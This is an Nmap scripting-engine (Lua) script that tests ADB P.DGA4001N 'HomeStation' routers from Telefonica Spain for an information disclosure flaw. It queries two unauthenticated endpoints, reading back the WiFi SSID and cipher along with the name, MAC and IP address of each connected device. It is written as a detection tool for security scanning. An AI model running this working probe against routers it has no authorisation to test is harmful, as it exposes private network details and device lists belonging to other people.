-- The Head Section --
description = [[Script to detect disclosure information vulnerability from ADB P.DGA4001N aka (HomeStation) Telefonica Spain.]]
author = "@danilabs"
license = "Same as Nmap. http://nmap.org/book/man-legal.html"
categories = {"default", "safe"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local json = require "json"
local table = require "table"

-- The Rule Section --
portrule = shortport.portnumber({80, 443})

-- The Action Section --
action = function(host, port)
  local options = {header={}}
  options['header']['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
  local out = {}

  --Leak wifi info
  local uri = "/getWifiInfo.jx"
  local response = http.get(host.ip, port.number, uri, options)

  if ( response.status == 200 ) then
    local body = response.body
    if ( body ) then
      local status, info = json.parse (body)
      if ( status ) then
        table.insert(out, string.format("SSID: %s", info.WIFI.ssidName))
        table.insert(out, string.format("Cipher Algorithm: %s", info.WIFI.SECURITY.cipherAlgorithm))
      end
    end
  end

  --Leak list devices
  uri = "/listDevices.jx"

  local response = http.get(host.ip, port.number, uri, options)
  if ( response.status == 200 ) then
    local body = response.body
    if ( body ) then
      local status, info = json.parse (body)
      if ( status ) then
        for i,v in ipairs(info.DEVICES) do
          table.insert(out, string.format("Device: %s MAC: %s IP: %s", info.DEVICES[i].nameDevice,  info.DEVICES[i].macAddress,  info.DEVICES[i].ipAddress))
        end
      end
    end
  end

  return stdnse.format_output(true,out)
end
